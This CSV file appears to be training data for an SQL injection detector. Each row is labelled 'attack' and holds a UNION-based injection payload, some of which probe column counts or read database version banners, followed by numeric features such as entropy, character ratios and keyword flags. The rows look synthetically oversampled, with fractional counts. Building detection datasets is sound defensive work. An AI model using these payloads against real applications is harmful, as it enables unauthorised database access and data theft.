id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001907,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,0.05269282881414213,70.63390638842084,25.0,4.221391896368184,27.0,23.70712511073667,11.0,8.926781277684167,0.38239106434328585,0.3354656699829713,0.1557889521398572,0.12635431353388568,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,3.9267812776841673,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001908,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000117,0.24676778864619367,86.82101446845245,26.0,4.010881531741575,25.0,29.456811574761954,22.0,10.36420289369049,0.2884798313670203,0.3384322698127675,0.2538622516029779,0.11922564721723432,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.3642028936904884,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001909,attack,union,"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",nearest_attack_euclidean,R000051,0.17577643156695874,109.28220314477102,28.81186457015265,4.118984848037894,29.0,48.3762708596947,15.0,16.905932285076325,0.2653846747052458,0.4426169538628533,0.13726793519236852,0.15473043623953245,2.8118645701526512,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.094067714923675,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001910,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000121,0.38324023591779366,63.76667449415576,23.0,4.013045756889088,27.0,18.213339595324605,11.0,7.553334898831151,0.4275045109608975,0.2806611866845393,0.17416850446555082,0.11766579788901232,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,2.5533348988311513,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001911,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000061,0.012539477568844415,56.0850768214445,20.0,3.740588366862446,14.0,28.0680614571556,4.0,10.0170153642889,0.24965132450227664,0.500418410597268,0.07132894985779331,0.17860131504266202,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,5.0170153642889,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001912,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,0.057754585503206037,83.21991351599618,27.0,3.9958690633633056,25.0,32.07996855127134,16.119952826907014,10.019992137817836,0.3005001489489997,0.38549091992356366,0.19359618923062588,0.12041274189681088,0.9800078621821646,0.0,3.0,0.0,0.0,1.0,0.0,1.0199921378178354,0.0,0.0,4.019992137817836,4.0,0.9800078621821646,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001913,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,0.5050647487107698,73.27152384403335,24.0,3.9947267568808873,27.0,26.61721907522668,11.0,8.65430476880667,0.37496268890698636,0.3555997761102384,0.15276257696210555,0.11667495802066971,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,4.65430476880667,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001914,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,0.011082181763041824,100.0,26.0,4.0503498390203285,62.0,5.047905218454467,23.952094781545533,9.0,0.62,0.05047905218454468,0.2395209478154553,0.09,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001915,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000096,0.23265744930735258,93.35681994084612,30.671363988169222,4.332350011024613,37.0,26.685455952676893,17.0,12.671363988169222,0.3970028064629961,0.2849693321561131,0.1824066948613766,0.13562116651951414,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.6713639881692233,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001916,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,0.7055075488166684,91.00621605880993,25.001243211761988,4.029394085066577,27.0,40.004972847047945,11.0,13.001243211761986,0.2985895275735766,0.43726901835506243,0.12164758530775344,0.14249386876360748,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,8.001243211761986,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001917,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000134,0.5891190431132222,110.74323499635769,30.851353000728462,4.356260104164185,37.0,40.59458799708615,17.0,16.148646999271538,0.33478263396561203,0.3656873937743411,0.1538190480382542,0.14571092422179263,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.148646999271538,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001918,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000013,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001919,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000054,0.9547894049491555,85.20353288996053,29.040706577992104,4.31293183755076,33.162826311968416,24.0,16.040706577992104,12.0,0.3877949515484192,0.28265489036679825,0.1882227129013834,0.14132744518339913,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.520353288996052,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.520353288996052
SMOTE_001920,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000010,1.3648000222764087,102.60333853237398,26.603338532373975,4.105835540639829,62.0,5.0,24.0,11.603338532373977,0.604282601465145,0.04873246786009233,0.23391584572844323,0.11306908494631943,3.0,0.0,2.0,0.0,1.3966614676260238,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.603338532373976,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.6033385323739759,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001921,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000096,0.34038872967814493,92.57790749816161,30.515581499632322,4.327030636264829,37.0,26.062325998529285,17.0,12.515581499632322,0.3999552541015229,0.2811391298142406,0.18376322485745644,0.13514239122678007,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.5155814996323214,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001922,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000099,0.9011711072015944,38.45299792156504,19.528201247060977,3.9113782062685303,14.0,13.962398337252031,4.0,6.490599584313008,0.36562197093366494,0.36125363487960205,0.10446342026676142,0.1686609739199716,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,1.4905995843130078,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001923,attack,union," select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",nearest_attack_euclidean,R000029,1.268920386758544,90.35092333248124,28.0,3.968175776855889,49.57656252808922,2.5069602298262943,26.774360804392025,11.493039770173707,0.5451176918246806,0.0270412922128464,0.2972782770495382,0.13056273891293488,0.0,0.0,2.0,0.0,1.0,1.2534801149131463,0.0,2.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.7465198850868535,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.2534801149131463,1.2534801149131465,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.5069602298262925
SMOTE_001924,attack,union,"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",nearest_attack_euclidean,R000075,0.6406233258347341,101.14373148146666,27.0,3.880976060762185,25.0,42.714577160488886,20.071865740733333,13.357288580244443,0.247967917354156,0.4226017835808295,0.1974791408279297,0.13195115823708484,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.678644290122222,0.0,0.0,6.678644290122222,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001925,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000022,1.6917113935750014,100.73798714323146,26.737987143231464,4.126827038284342,62.63100642838427,4.0,23.0,11.106980714847198,0.6218242600798867,0.03971059327716414,0.22833591134369377,0.1101292352992554,3.0,0.7379871432314654,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.368993571615733,1.0,0.3689935716157326,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001926,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000141,1.9070861607091036,43.17914811373141,19.0,3.778737220801586,24.70900613268664,4.430331289104455,9.529858018955235,4.5099526729850785,0.5450215695243812,0.12511203558806572,0.22317985731596535,0.10668653757158769,0.509952672985078,0.0,2.490047327014922,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.5099526729850776,2.4900473270149224,0.509952672985078,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001927,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000025,1.3517674462890432,75.0,32.0,4.392794881546597,44.0,2.3957813689995717,17.0,11.604218631000428,0.5866666666666667,0.03194375158666096,0.22666666666666666,0.1547229150800057,0.0,0.0,2.0,0.0,1.6042186310004287,1.0,0.0,-1.1102230246251565e-16,0.39578136899957134,0.0,1.0,6.604218631000428,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001928,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000069,0.2898826126962411,95.68024173695467,27.0,4.0243750613202955,25.0,42.14419338956374,16.0,12.536048347390935,0.2614652135808792,0.4402238661127102,0.1673377366917627,0.13097318361464788,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.536048347390935,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001929,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000066,1.1545146218873776,97.59383735101312,30.0250232936035,4.3313534682183965,33.050046587207,34.025023293603496,16.01251164680175,14.506255823400874,0.33749025499145496,0.3491269101790365,0.16425592465047203,0.1491269101790365,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.506255823400875,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.506255823400875,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.506255823400875
SMOTE_001930,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000116,0.4016747402744043,79.974225622433,27.805154875513402,4.2049488981879914,29.0,24.7793804979464,15.0,11.1948451244866,0.3640198611566028,0.3079455669883162,0.18828613508100148,0.13974843677407953,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.1948451244865996,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001931,attack,union,"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",nearest_attack_euclidean,R000070,0.5300626763543754,106.84376771435224,33.275014171481786,4.418663847017295,37.0,38.275014171481786,17.0,14.568753542870446,0.3464873495561898,0.3579945162418336,0.15919689033662773,0.1363212438653489,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.568753542870446,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001932,attack,union,"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",nearest_attack_euclidean,R000156,0.9713626589383442,84.29126003207976,21.25825200641595,3.578129770793102,14.0,41.03300802566381,14.0,15.258252006415953,0.166199665874984,0.4865949157786016,0.16619966587498403,0.1810057524714304,0.7417479935840475,0.2582520064159524,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,1.0,0.0,8.258252006415951,3.0,0.7417479935840475,0.2582520064159524,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001933,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000043,0.4851751357088332,80.1804579692843,24.96390840614314,4.066870094034013,27.0,32.14436637542744,11.0,10.03609159385686,0.33805923683597233,0.39933720078699575,0.13772783722947024,0.1248757251475617,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,6.03609159385686,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001934,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000021,0.33648617381383855,75.08446054106285,31.25338162318856,4.353822291447766,45.66215783574859,2.084460541062853,17.0,10.337842164251411,0.6082064303144303,0.02774835429782252,0.2264147668073564,0.13763044858039075,0.2533816231885577,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.0,0.08446054106285261,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001935,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000108,0.4772104793182912,76.87515196536589,28.424969606926823,4.268745453626728,29.0,22.300121572292706,15.0,10.575030393073176,0.3784782163777975,0.2884018592410461,0.19576459467817114,0.13735532970298525,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.5750303930731762,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001936,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000112,0.1557719916560259,65.81601408878396,20.83679718224321,3.854247542130353,14.0,36.652811271027176,4.0,11.163202817756794,0.21287380280374166,0.556715653938581,0.06082108651535477,0.16958945674232262,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,7.163202817756793,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001937,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000106,0.3626725011225972,92.3263584855634,26.53472830288732,3.9871583963385304,25.0,33.86108678845073,22.0,11.465271697112682,0.27097555998373274,0.36643910402602764,0.2384584927856848,0.12412684320455483,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,4.465271697112682,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001938,attack,union,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",nearest_attack_euclidean,R000053,0.3884266389358076,111.37639410446914,27.415737263687234,4.051363872369974,29.0,51.16852547262553,15.0,16.207868631843617,0.2604099419209039,0.4593137581505295,0.13469479754529512,0.1455815023832715,1.4157372636872332,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.792131368156383,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
